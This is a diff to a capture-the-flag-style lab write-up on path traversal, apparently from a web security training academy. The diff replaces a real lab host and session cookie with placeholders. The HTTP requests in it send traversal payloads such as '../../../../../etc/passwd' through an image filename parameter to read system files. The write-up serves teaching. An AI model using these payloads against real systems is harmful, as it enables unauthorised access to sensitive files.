@@ -7,8 +7,8 @@ To solve the lab, retrieve the contents of the /etc/passwd file.
 Okay, so first, i started burp on my kali machine and forwarded the browser traffic to my proxy using FoxyProxy, loading the pag of the lab application:
 
 GET / HTTP/1.1
-Host: 0ae10088047f746d812ca79c00c50091.web-security-academy.net
-Cookie: session=2dk14vfUXEjKdK83uO8bZpaj62YzFaYv
+Host: LAB_ID.web-security-academy.net
+Cookie: session=sessionID
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 Accept-Language: en-US,en;q=0.5
@@ -26,13 +26,13 @@ Connection: keep-alive
 After this request, i intercept 21 request that load the images of the products available on the page, i choose one of them and send it to Burp Repeater, this is the request:
 
 GET /image?filename=29.jpg HTTP/2
-Host: 0ae10088047f746d812ca79c00c50091.web-security-academy.net
-Cookie: session=2dk14vfUXEjKdK83uO8bZpaj62YzFaYv
+Host: LAB_ID.web-security-academy.net
+Cookie: session=sessionID
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
 Accept: image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5
 Accept-Language: en-US,en;q=0.5
 Accept-Encoding: gzip, deflate, br
-Referer: https://0ae10088047f746d812ca79c00c50091.web-security-academy.net/
+Referer: https://LAB_ID.web-security-academy.net/
 Sec-Fetch-Dest: image
 Sec-Fetch-Mode: no-cors
 Sec-Fetch-Site: same-origin
@@ -44,13 +44,13 @@ Looking this request, i can see the vulnerable parameter is filename=29.jpg, try
 Request: 
 
 GET /image?filename=../../../../../etc/passwd HTTP/2
-Host: 0ae10088047f746d812ca79c00c50091.web-security-academy.net
-Cookie: session=2dk14vfUXEjKdK83uO8bZpaj62YzFaYv
+Host: LAB_ID.web-security-academy.net
+Cookie: session=sessionID
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
 Accept: image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5
 Accept-Language: en-US,en;q=0.5
 Accept-Encoding: gzip, deflate, br
-Referer: https://0ae10088047f746d812ca79c00c50091.web-security-academy.net/
+Referer: https://LAB_ID.web-security-academy.net/
 Sec-Fetch-Dest: image
 Sec-Fetch-Mode: no-cors
 Sec-Fetch-Site: same-origin
@@ -70,13 +70,13 @@ Now, i have to try some differente payloads to see how the application responds,
 Request:
 
 GET /image?filename=/etc/passwd HTTP/2
-Host: 0ae10088047f746d812ca79c00c50091.web-security-academy.net
-Cookie: session=2dk14vfUXEjKdK83uO8bZpaj62YzFaYv
+Host: LAB_ID.web-security-academy.net
+Cookie: session=sessionID
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
 Accept: image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5
 Accept-Language: en-US,en;q=0.5
 Accept-Encoding: gzip, deflate, br
-Referer: https://0ae10088047f746d812ca79c00c50091.web-security-academy.net/
+Referer: https://LAB_ID.web-security-academy.net/
 Sec-Fetch-Dest: image
 Sec-Fetch-Mode: no-cors
 Sec-Fetch-Site: same-origin
